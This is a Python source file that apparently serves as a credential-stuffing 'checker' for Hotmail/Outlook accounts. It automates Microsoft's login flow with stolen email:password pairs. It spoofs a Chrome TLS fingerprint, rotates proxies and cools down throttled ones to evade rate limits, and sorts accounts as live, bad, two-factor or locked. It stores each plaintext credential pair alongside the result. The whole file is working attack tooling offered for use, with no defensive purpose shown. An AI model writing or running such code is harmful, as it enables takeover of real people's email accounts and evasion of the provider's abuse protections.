import json
import logging
import re
import requests
from modules.db import save_history
from modules.proxy_manager import get_random_proxy, mark_proxy_cooldown
from modules.tls_engine import create_tls_session

OUTLOOK_AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
OUTLOOK_CLIENT_ID = "e6f8716e-299d-4ed9-bbf3-453f192f44e5"
OUTLOOK_REDIRECT_URI = "msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D"
OUTLOOK_SCOPE = "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access"

OUTLOOK_AUTH_PARAMS = {
    "redirect_uri": OUTLOOK_REDIRECT_URI,
    "client_id": OUTLOOK_CLIENT_ID,
    "response_type": "code",
    "state": "v4WtWWgYCOSHR7rZivYT2A",
    "nonce": "MIgPdBlxPYQSDCh9SK1ocg",
    "scope": OUTLOOK_SCOPE,
    "code_challenge": "ybj7gD4AewA9XLNLnunRS0LlY3wIf_iJuP8YfJE2LNA",
    "code_challenge_method": "S256",
}

OUTLOOK_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

def check_outlook_account(email, password, use_proxy=True):
    """Check a Hotmail/Outlook account via Microsoft OAuth login flow."""
    email_lower = email.lower().strip()
    if "@hotmail." in email_lower or "@live." in email_lower:
        svc_type = "hotmail"
        svc_label = "Hotmail"
    else:
        svc_type = "outlook"
        svc_label = "Outlook"

    route = "Direct"
    proxies = None
    proxy_raw_url = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
            proxy_raw_url = proxy_result[2]

    session = create_tls_session(impersonate="chrome131")
    session.verify = False
    session.headers.update(OUTLOOK_HEADERS)

    if proxies:
        session.proxies = proxies

    try:
        auth_params = dict(OUTLOOK_AUTH_PARAMS)
        auth_params["login_hint"] = email

        r1 = session.get("https://login.live.com/oauth20_authorize.srf",
                         params=auth_params, timeout=20, allow_redirects=True)

        if r1.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        html1 = r1.text
        ppft = None
        url_post = None

        sd_match = re.search(r'var ServerData = ({.*?});', html1, re.DOTALL)
        if sd_match:
            try:
                sd = json.loads(sd_match.group(1))
                url_post = sd.get("urlPost", "")
                sft_tag = sd.get("sFTTag", "")
                ppft_val = re.search(r'value="([^"]+)"', sft_tag)
                if ppft_val:
                    ppft = ppft_val.group(1)
            except (json.JSONDecodeError, AttributeError):
                pass

        if not ppft:
            ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html1)
            if ppft_match:
                ppft = ppft_match.group(1)
        if not url_post:
            url_post_match = re.search(r"urlPost:'([^']+)'", html1)
            if url_post_match:
                url_post = url_post_match.group(1)

        if not ppft or not url_post:
            if "ServiceAbuse" in html1 or "account.live.com/Abuse" in html1:
                save_history(svc_type, "LOCKED", route=route, raw_cookie=f"{email}:{password}", email=email)
                return {"status": "LOCKED", "email": email, "reason": "Account locked (Abuse detected at auth)", "route": route, "service": svc_label}
            save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "email": email, "reason": "Failed to extract login parameters", "route": route, "service": svc_label}

        login_payload = {
            "ps": "2",
            "psRNGCDefaultType": "",
            "psRNGCEntropy": "",
            "psRNGCSLK": "",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": ppft,
            "PPSX": "Pass",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i13": "1",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "1",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
        }

        post_headers = dict(OUTLOOK_HEADERS)
        post_headers["Content-Type"] = "application/x-www-form-urlencoded"
        post_headers["Referer"] = r1.url
        post_headers["Origin"] = "https://login.live.com"

        r2 = session.post(url_post, data=login_payload, headers=post_headers,
                          timeout=20, allow_redirects=True)

        if r2.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        html2 = r2.text
        final_url = r2.url
        html2_lower = html2.lower()

        sd2 = {}
        sd2_match = re.search(r'var ServerData = ({.*?});', html2, re.DOTALL)
        if sd2_match:
            try:
                sd2 = json.loads(sd2_match.group(1))
            except json.JSONDecodeError:
                pass

        err_txt = sd2.get("sErrTxt", "")

        if "account.live.com/Abuse" in html2 or "ServiceAbuse" in html2:
            save_history(svc_type, "LOCKED", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "LOCKED", "email": email, "reason": "Account locked by Microsoft (Abuse)", "route": route, "service": svc_label}

        if "PhoneLocked" in html2 or "iShowPhoneLock" in html2 or "phoneVerification" in html2:
            save_history(svc_type, "PHONE_LOCKED", plan=f"{svc_label} Phone Locked", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "PHONE_LOCKED", "email": email, "reason": "Phone verification required", "route": route, "service": svc_label}

        bad_indicators = [
            "bad user credential",
            "your account or password is incorrect",
            "that microsoft account doesn't exist",
            "that microsoft account doesn\\'t exist",
            "aadsts50126",
            "aadsts50034",
            "aadsts700016",
            "account doesn't exist",
            "password is incorrect",
            "too many signin attempts",
        ]
        is_invalid = any(ind in html2_lower for ind in bad_indicators)

        if not is_invalid and err_txt:
            err_lower = err_txt.lower()
            if "incorrect" in err_lower or "doesn't exist" in err_lower or "bad" in err_lower:
                is_invalid = True

        if is_invalid:
            save_history(svc_type, "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "email": email, "reason": "Wrong password or account not found", "route": route, "service": svc_label}

        twofa_indicators = [
            "identity/confirm", "iShowTwoFactorAuth", "TwoFactorAuth",
            "sProofConfirmation", "iProofOptions", "iSelectProofTitle",
            "ConvergedTFA", "OneTimeCode", "ProofConfirmation",
            "iSignInWithSecurityCode", "arrProofs",
        ]
        if any(ind in html2 for ind in twofa_indicators):
            save_history(svc_type, "2FA", plan=f"{svc_label} 2FA", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "2FA", "email": email, "reason": "Two-factor authentication enabled", "route": route, "service": svc_label}

        live_indicators = [
            "code=" in final_url,
            "oauth20_desktop.srf" in final_url,
            "access_token=" in final_url,
            "kmsi" in html2_lower,
            "iShowKmsi" in html2,
            "fmHF" in html2,
            "idSIButton9" in html2 and "urlPost" not in html2,
        ]
        if any(live_indicators):
            save_history(svc_type, "LIVE", plan=f"{svc_label} Valid", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "LIVE", "email": email, "reason": "Account valid and active", "route": route, "service": svc_label}

        if "consent" in final_url.lower() or "msauth://" in final_url:
            save_history(svc_type, "LIVE", plan=f"{svc_label} Valid", route=route,
                         raw_cookie=f"{email}:{password}", email=email)
            return {"status": "LIVE", "email": email, "reason": "Account valid (consent redirect)", "route": route, "service": svc_label}

        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": "Could not determine account status", "route": route, "service": svc_label}

    except requests.exceptions.Timeout:
        if proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)
        if use_proxy:
            return check_outlook_account(email, password, use_proxy=False)
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": "Request timed out", "route": route, "service": svc_label}
    except requests.exceptions.ProxyError:
        if proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)
        if use_proxy:
            return check_outlook_account(email, password, use_proxy=False)
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": "Proxy connection failed", "route": route, "service": svc_label}
    except Exception as e:
        save_history(svc_type, "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "email": email, "reason": f"Request failed: {str(e)[:150]}", "route": route, "service": svc_label}
    finally:
        session.close()
